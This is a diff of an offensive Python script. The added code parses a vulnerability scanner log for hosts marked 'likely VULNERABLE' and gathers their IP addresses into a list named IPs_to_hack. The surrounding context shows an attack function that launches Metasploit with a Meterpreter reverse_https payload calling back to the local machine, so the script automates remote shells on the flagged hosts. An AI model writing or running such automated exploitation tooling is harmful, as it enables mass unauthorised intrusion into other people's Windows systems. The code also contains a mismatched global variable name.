@@ -1,4 +1,6 @@
-import os, sys, socket
+import os, sys, socket, re
+
+IPs_to_hack = []
 
 def get_local_ip():
 	# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
@@ -13,6 +15,18 @@ def attack(target):
 		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; run; show sessions; sessions -i 1;"'
 	print attack_cmd
 	os.system(attack_cmd)
+
+def parse_scan_log():
+	global ip_to_hack
+
+	scannerFile = open ("scanner.log", "r")
+
+	for line in scannerFile.readlines():
+		if "Host is likely VULNERABLE" in line:
+			get_ip = re.findall("[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", line)
+			IPs_to_hack.append(get_ip[0])
+
+	print(IPs_to_hack)
 
 
 
